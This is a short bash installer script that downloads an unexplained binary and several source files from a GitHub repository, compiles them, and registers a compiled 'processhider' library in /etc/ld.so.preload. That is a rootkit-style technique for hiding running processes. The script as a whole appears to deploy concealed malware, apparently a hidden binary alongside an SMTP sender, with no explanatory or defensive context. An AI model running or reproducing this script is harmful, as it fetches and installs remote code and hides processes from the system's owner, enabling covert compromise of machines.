#!/bin/bash
wget https://github.com/hudahadoh/hime/raw/main/bhmax
wget https://raw.githubusercontent.com/hudahadoh/hime/main/hi.c
wget https://raw.githubusercontent.com/hudahadoh/hime/main/processhider.c
wget https://raw.githubusercontent.com/hudahadoh/hime/main/smtp.py
gcc -o hi hi.c
gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl
mv libprocess.so /usr/local/lib/
echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
chmod +x hi
chmod +x bhmax
